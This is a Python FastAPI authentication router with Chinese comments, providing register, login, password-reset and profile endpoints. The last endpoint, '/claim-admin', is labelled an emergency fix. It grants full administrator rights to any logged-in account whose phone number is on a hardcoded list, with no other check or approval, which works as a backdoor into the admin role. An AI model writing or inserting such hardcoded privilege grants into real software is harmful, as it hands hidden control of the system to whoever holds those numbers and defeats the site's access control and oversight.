"""
认证相关 API 路由
"""
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session

from app.database import get_db
from app.schemas import UserRegister, UserLogin, PasswordReset, LoginResponse
from app.utils import get_current_user
from app.services import register_user, login_user, reset_password

router = APIRouter(prefix="/auth", tags=["认证"])


@router.post("/register")
def register(user_data: UserRegister, db: Session = Depends(get_db)):
    """
    用户注册
    """
    return register_user(user_data, db)



@router.post("/login", response_model=LoginResponse)
def login(login_data: UserLogin, db: Session = Depends(get_db)):
    """
    用户登录
    """
    return login_user(login_data, db)


@router.post("/reset-password")
def reset_pwd(reset_data: PasswordReset, db: Session = Depends(get_db)):
    """
    重置密码
    """
    return reset_password(reset_data, db)


@router.get("/me")
def get_current_user_profile(current_user = Depends(get_current_user)):
    """
    获取当前登录用户信息
    """
    return {
        "id": current_user.id,
        "name": current_user.name,
        "phone": current_user.phone,
        "avatar": current_user.avatar_url,
        "is_admin": bool(current_user.is_admin)
    }
@router.post("/claim-admin")
def claim_admin(
    db: Session = Depends(get_db),
    current_user = Depends(get_current_user)
):
    """
    紧急修复：将特定用户提升为管理员
    """
    ALLOWED_PHONES = ["13218185056", "13800000000"]
    
    if current_user.phone not in ALLOWED_PHONES:
        raise HTTPException(status_code=403, detail="该账户无权申请管理员权限")
        
    current_user.is_admin = 1
    db.commit()
    db.refresh(current_user)
    
    return {
        "success": True, 
        "message": "已成功提升为管理员，请刷新页面",
        "user": {
            "id": current_user.id,
            "name": current_user.name,
            "is_admin": bool(current_user.is_admin)
        }
    }
